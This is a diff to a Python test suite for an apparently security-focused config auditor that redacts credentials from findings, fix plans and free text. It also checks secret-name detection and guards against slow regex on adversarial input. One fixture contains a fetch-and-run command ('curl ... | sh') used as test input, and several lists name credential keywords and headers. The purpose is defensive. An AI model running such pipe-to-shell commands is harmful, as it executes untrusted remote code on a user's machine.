@@ -160,7 +160,7 @@ class TestEveryLayerRedactsOnItsOwn(unittest.TestCase):
                                         {"client": "c", "path": "p"}, [])
         self.assertClean(result["findings"][0]["message"])
 
-    def test_the_fix_plan_masks_the_values_of_credential_flags(self):
+    def test_the_fix_plan_never_shows_an_argument(self):
         cfg = {"command": "bash", "args": [
             "-c", "curl https://x.example/i.sh | sh", "--password",
             "plain-secret-1", "--api-key=plain-secret-2"]}
@@ -170,7 +170,8 @@ class TestEveryLayerRedactsOnItsOwn(unittest.TestCase):
                                 "message": "m"}]}
         (item,), _notes = cli_mod._plan_fix([result])
         self.assertNotIn("plain-secret", item["runs"])
-        self.assertIn("--password", item["runs"])
+        self.assertNotIn("--password", item["runs"])  # not even the flag
+        self.assertIn("https://x.example/...", item["runs"])
         with isolated_machine() as (home, cwd):
             p = write_json(os.path.join(cwd, "m.json"), {"mcpServers": {"s": cfg}})
             code, out, err = run_cli("--config", p, "--fix")
@@ -183,41 +184,153 @@ class TestSecretNames(unittest.TestCase):
         for name in ("API_KEY", "OPENAI_KEY", "apiKey", "APIKey", "GITHUB_PAT",
                      "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD", "ACCESS_TOKEN",
                      "accessToken", "SSH_PRIVATE_KEY", "--api-key",
-                     "client_secret", "PASSPHRASE", "BEARER", "DSN"):
+                     "client_secret", "PASSPHRASE", "BEARER", "DSN",
+                     # round 2: AUTH, PASS and APIKEY were not words
+                     "AUTH", "--auth", "MY_PASS", "PASS", "--pass", "db_pass",
+                     "BASIC_AUTH", "x-auth", "APIKEY", "apikey", "--apikey",
+                     "X-API-Key", "Api-Key", "accesstoken", "authtoken",
+                     "SECRETKEY", "PASSCODE", "Cookies", "api-keys"):
             self.assertTrue(redact.is_secret_name(name), name)
 
     def test_not_secret_names(self):
         for name in ("KEYBOARD_LAYOUT", "MONKEY", "PUBLIC_KEY",
                      "NEXT_PUBLIC_KEY", "PATH", "HOME", "NODE_ENV", "PORT",
-                     "--port", "--keyboard", "TOKENIZER_MODE"):
+                     "--port", "--keyboard", "TOKENIZER_MODE",
+                     # AUTH and PASS only count as the last word of a name
+                     "AUTH_URL", "AUTH0_DOMAIN", "OAUTH_CLIENT_ID",
+                     "PASS_THROUGH", "PASSENGER", "COMPASS", "BYPASS",
+                     "AUTHOR", "AUTHORITY", "--auth-url", "SESSION_TYPE",
+                     "PRIVATE_NETWORK", "SIGNATURE_ALGORITHM"):
             self.assertFalse(redact.is_secret_name(name), name)
 
+    def test_an_option_that_is_given_a_credential(self):
+        for flag in ("--auth", "--token", "--api-key", "--private-key",
+                     "--password", "-pass", "--session"):
+            self.assertTrue(redact.takes_a_credential(flag), flag)
+        for flag in ("--no-auth", "--skip-password", "--without-token",
+                     "--disable-auth", "--port", "-y", "--prefer-online"):
+            self.assertFalse(redact.takes_a_credential(flag), flag)
 
-class TestCommandLine(unittest.TestCase):
-    def test_flag_values_are_masked_after_equals_and_as_next_arg(self):
-        cfg = {"command": "node", "args": [
-            "s.js", "--api-key=" + S_FLAG_EQ, "--password", S_FLAG_NEXT,
-            "--port", "3000", f"https://u:{S_PASS}@h.example/p?t=1"]}
-        line = redact.command_line(cfg)
-        for s in (S_FLAG_EQ, S_FLAG_NEXT, S_PASS):
-            self.assertNotIn(s, line)
-        self.assertIn("--port 3000", line)
-        self.assertIn("https://h.example/...", line)
-        self.assertIn("--api-key=[redacted]", line)
+    def test_names_whose_value_is_never_printed(self):
+        """The wider list, for a header or key whose value is about to be
+        shown: it adds AUTH and PASS anywhere, SESSION, PRIVATE, SIGNATURE."""
+        for name in ("X-Session-Id", "--private-url", "X-Hub-Signature",
+                     "--auth-url", "PASS_FILE", "--otp", "jwt", "AUTH_MODE"):
+            self.assertTrue(redact.is_credential_name(name), name)
+        for name in ("KEYBOARD_LAYOUT", "PUBLIC_KEY", "--port", "PATH",
+                     "AUTHOR", "COMPASS", "Content-Type", "Accept"):
+            self.assertFalse(redact.is_credential_name(name), name)
 
-    def test_key_value_args_and_token_shapes(self):
-        cfg = {"command": "env", "args": ["API_TOKEN=" + S_ENV, "node",
-                                          "ghp_" + "A1b2C3d4E5" * 4]}
-        line = redact.command_line(cfg)
-        self.assertNotIn(S_ENV, line)
-        self.assertNotIn("ghp_A1b2", line)
 
-    def test_long_lines_are_cut_and_odd_configs_do_not_raise(self):
-        self.assertLessEqual(len(redact.command_line(
-            {"command": "x", "args": ["a" * 1000]})), 200)
-        for cfg in ({}, {"command": None}, {"args": "str"}, None, "x",
-                    {"command": ["a"], "args": {"b": 1}}):
-            self.assertIsInstance(redact.command_line(cfg), str)
+FAKE = "FAKE-aaaa1111"
+
+
+class TestTheValueAfterTheNameOfACredential(unittest.TestCase):
+    """Free text that quotes a command line loses the value that follows the
+    name of a credential: a header, a JSON key, an assignment, a flag."""
+
+    MASKED = (
+        # headers
+        ("X-API-Key: {V}", "X-API-Key: [redacted]"),
+        ("x-api-key:{V}", "x-api-key:[redacted]"),
+        ("Authorization: Token {V}", "Authorization: [redacted]"),
+        ("Authorization: Digest user=\"u\", response=\"{V}\" tail",
+         "Authorization: [redacted]"),
+        ("Proxy-Authorization: Basic {V}", "Proxy-Authorization: [redacted]"),
+        ("Cookie: sid={V}; theme=dark", "Cookie: [redacted]"),
+        ("X-Auth-Token: {V} and more", "X-Auth-Token: [redacted]"),
+        ("PRIVATE-TOKEN: {V}", "PRIVATE-TOKEN: [redacted]"),
+        ("curl -H 'X-Api-Key: {V}' https://e.example/c",
+         "curl -H 'X-Api-Key: [redacted]' https://e.example/..."),
+        ('curl -H "X-Session-Id: {V}" -s',
+         'curl -H "X-Session-Id: [redacted]" -s'),
+        # JSON and its relatives
+        ('{"token":"{V}"}', '{"token":"[redacted]"}'),
+        ('{"token": "{V}", "port": 8080}',
+         '{"token": "[redacted]", "port": 8080}'),
+        ('{"db": {"pass": "{V}"}}', '{"db": {"pass": "[redacted]"}}'),
+        ("{'password': '{V}', 'user': 'u'}",
+         "{'password': '[redacted]', 'user': 'u'}"),
+        ("{token: '{V}'}", "{token: '[redacted]'}"),
+        ('{"apiKey":"a \\"quoted\\" {V}"}', '{"apiKey":"[redacted]"}'),
+        ('{"Authorization": "Bearer {V}"}', '{"Authorization": "[redacted]"}'),
+        ('{"token": 12345}', '{"token": [redacted]}'),
+        # assignments
+        ("MY_PASS={V}", "MY_PASS=[redacted]"),
+        ("-e MY_PASS={V}", "-e MY_PASS=[redacted]"),
+        ("export AUTH={V}; run", "export AUTH=[redacted]; run"),
+        ("apikey={V}&other=1", "apikey=[redacted]&other=1"),
+        ("--auth={V}", "--auth=[redacted]"),
+        ("--password={V} --port=80", "--password=[redacted] --port=80"),
+        ('PASS="a b c"', 'PASS="[redacted]"'),
+        # a flag takes the next word
+        ("--auth {V} go", "--auth [redacted] go"),
+        ("--pass {V}", "--pass [redacted]"),
+        ("run --apikey {V} --port 80", "run --apikey [redacted] --port 80"),
+        ("--token 'two words' x", "--token '[redacted]' x"),
+    )
+    UNTOUCHED = (
+        "server receives secrets via env: API_KEY, DB_PASSWORD",
+        "matches CVE-2026-1: title. Fixed in 1.2.3.",
+        "KEYBOARD_LAYOUT=us PUBLIC_KEY=ssh-rsa AAAA NODE_ENV=production",
+        "--port 3000 --no-color --keyboard us",
+        "cannot read --config file '/home/u/.aws/credentials': No such file",
+        "skipped /home/u/secrets.json: not UTF-8 text",
+        "token is a word; so is password",
+        "--password", "--password ", "password=", "token:", "x --token --y",
+        "unpinned package 'pkg' - pin with pkg@x.y.z",
+    )
+
+    def test_the_value_goes_and_the_rest_stays(self):
+        for text, want in self.MASKED:
+            text = text.replace("{V}", FAKE)
+            got = redact.redact_text(text)
+            self.assertEqual(got, want.replace("{V}", FAKE), text)
+            self.assertNotIn(FAKE, got, text)
+
+    def test_ordinary_text_is_left_alone(self):
+        for text in self.UNTOUCHED:
+            self.assertEqual(redact.redact_text(text), text)
+
+    def test_twice_is_the_same_as_once(self):
+        for text, _ in self.MASKED:
+            once = redact.redact_text(text.replace("{V}", FAKE))
+            self.assertEqual(redact.redact_text(once), once, text)
+
+    def test_the_other_layers_apply_it_too(self):
+        leak = "ran curl -H 'X-Api-Key: FAKE-aaaa1111' --auth FAKE-aaaa1111"
+        self.assertNotIn("FAKE-aaaa1111", redact.clean(leak))
+        with unittest.mock.patch.object(
+                detectors, "STATIC_DETECTORS",
+                (lambda name, cfg: [{"severity": "low", "check": "x",
+                                     "message": leak}],)):
+            (f,) = detectors.audit_server("s", {"command": "node"}, [])
+        self.assertNotIn("FAKE-aaaa1111", f["message"])
+
+
+class TestRedactionTimeIsLinear(unittest.TestCase):
+    """A hostile config can put a megabyte in a package name and a megabyte
+    into a message. Scrubbing it must not take longer than reading it."""
+
+    def test_adversarial_text_is_scrubbed_in_linear_time(self):
+        import time
+        n = 100_000
+        for label, text in (
+                ("letters", "a" * n),
+                ("scheme chars", "xoxb-" * (n // 5)),
+                ("jwt-like blocks", "eyJaaaaaaaaa-" * (n // 13)),
+                ("punctuation then a letter", "https://x/" + "." * n + "a"),
+                ("url-like starts", "a://" * (n // 4)),
+                ("names", "token=a " * (n // 8)),
+                ("open quotes", 'token="' * (n // 7)),
+                ("one open quote", "token='" + "a" * n),
+                ("headers", "x-api-key: " * (n // 11)),
+                ("flags", "--auth x " * (n // 9)),
+                ("dashes", "-" * n),
+                ("spaces", "bearer" + " " * n)):
+            start = time.monotonic()
+            redact.clean(text)
+            self.assertLess(time.monotonic() - start, 3.0, label)
 
 
 class TestSecretEnvDetector(unittest.TestCase):
@@ -241,6 +354,15 @@ class TestSecretEnvDetector(unittest.TestCase):
         msg = self._names({"API_KEY": S_ENV, "DB_PASSWORD": S_DB})
         self.assertNotIn(S_ENV, msg)
         self.assertNotIn(S_DB, msg)
+
+    def test_the_words_the_panel_found_missing_are_flagged(self):
+        msg = self._names({"MY_PASS": "v", "AUTH": "v", "PASS": "v",
+                           "APIKEY": "v", "OPENAI_API_KEY": "v",
+                           "AUTH_URL": "https://auth.example", "PORT": "1"})
+        for name in ("MY_PASS", "AUTH", "PASS", "APIKEY", "OPENAI_API_KEY"):
+            self.assertIn(name, msg)
+        self.assertNotIn("AUTH_URL", msg)
+        self.assertNotIn("PORT", msg)
 
 
 class TestNoSecretInAnyOutput(unittest.TestCase):
